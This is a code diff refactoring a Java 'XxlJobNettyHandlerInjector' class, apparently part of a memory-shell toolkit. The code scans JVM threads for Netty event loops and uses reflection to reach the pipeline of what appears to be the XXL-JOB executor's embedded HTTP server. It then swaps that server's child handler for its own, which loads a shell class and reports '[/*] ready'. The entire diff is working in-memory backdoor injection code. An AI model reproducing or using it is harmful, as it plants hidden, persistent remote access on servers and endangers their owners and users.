@@ -38,16 +38,8 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
     }
 
     public XxlJobNettyHandlerInjector() {
-        Object context = null;
         try {
-            context = getContext();
-        } catch (Throwable e) {
-            msg += "context error: " + getErrorMessage(e);
-        }
-        try {
-            handlerClass = getShellClass(context);
-            msg += "context: [" + context + "] ";
-            inject(context);
+            inject();
             msg += "[/*] ready\n";
         } catch (Throwable e) {
             msg += "failed " + getErrorMessage(e) + "\n";
@@ -60,7 +52,7 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
         return msg;
     }
 
-    private Class<?> handlerClass;
+    private static Class<?> handlerClass;
 
     @Override
     protected void initChannel(SocketChannel channel) throws Exception {
@@ -94,26 +86,28 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
         }
     }
 
-    public Object getContext() throws Exception {
+    public void inject() throws Exception {
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
-            if (thread == null
-                    || !thread.getName().contains("nioEventLoopGroup")) {
-                continue;
-            }
-            Object target = getFieldValue(getFieldValue(getFieldValue(thread, "target"), "runnable"), "val$eventExecutor");
-            if (target.getClass().getName().endsWith("NioEventLoop")) {
-                HashSet<?> set = (HashSet<?>) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
-                Object keys = set.toArray()[0];
-                return getFieldValue(getFieldValue(keys, "attachment"), "pipeline");
+            if (thread != null && thread.getName().contains("nioEventLoopGroup")) {
+                Object target;
+                try {
+                    target = getFieldValue(getFieldValue(getFieldValue(thread, "target"), "runnable"), "val$eventExecutor");
+                    if (target.getClass().getName().endsWith("NioEventLoop")) {
+                        HashSet<?> set = (HashSet<?>) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
+                        if (!set.isEmpty()) {
+                            Object keys = set.toArray()[0];
+                            Object pipeline = getFieldValue(getFieldValue(keys, "attachment"), "pipeline");
+                            Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, "head"), "next"), "handler");
+                            handlerClass = getShellClass(embedHttpServerHandler);
+                            setFieldValue(embedHttpServerHandler, "childHandler", this);
+                            return;
+                        }
+                    }
+                } catch (Exception ignored) {
+                }
             }
         }
-        return null;
-    }
-
-    public void inject(Object pipeline) throws Exception {
-        Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, "head"), "next"), "handler");
-        setFieldValue(embedHttpServerHandler, "childHandler", this);
     }
 
     @SuppressWarnings("all")
